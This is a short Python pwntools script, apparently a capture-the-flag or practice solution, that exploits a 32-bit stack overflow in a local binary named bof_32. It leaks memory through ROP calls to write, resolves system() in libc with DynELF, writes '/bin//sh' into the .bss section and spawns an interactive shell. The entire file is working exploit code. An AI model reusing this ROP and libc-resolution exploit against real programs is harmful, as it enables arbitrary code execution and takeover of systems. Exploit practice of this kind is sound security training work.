# coding:utf-8
# 32位 stackoverflow 写/bin/sh到.bss段，使用DynELF获取system地址
from pwn import *

#context.log_level='debug'

io = process('./bof_32')
e = ELF('./bof_32')
libc = ELF('/lib32/libc.so.6')

gdb.attach(io, 'b main')

_bss = 0x080497E5

def leak(addr):
	#addr = e.got['write']
	r = ROP(e)
	r.write(1,addr,8)
	r.main()

	io.sendline('A'*8 + r.chain())
	io.recv(4)
	buf = io.recv(8)
	log.info('%#x -> %s'%(addr, buf))
	return buf

d = DynELF(leak, elf=e)
system_addr = d.lookup('system', 'libc')
log.info('system: %#x' % system_addr)

r = ROP(e)
r.read(0,_bss,8)
r.call(system_addr,[_bss])
io.sendline('A'*8 + r.chain())
io.recv(4)
io.send('/bin//sh')

io.interactive()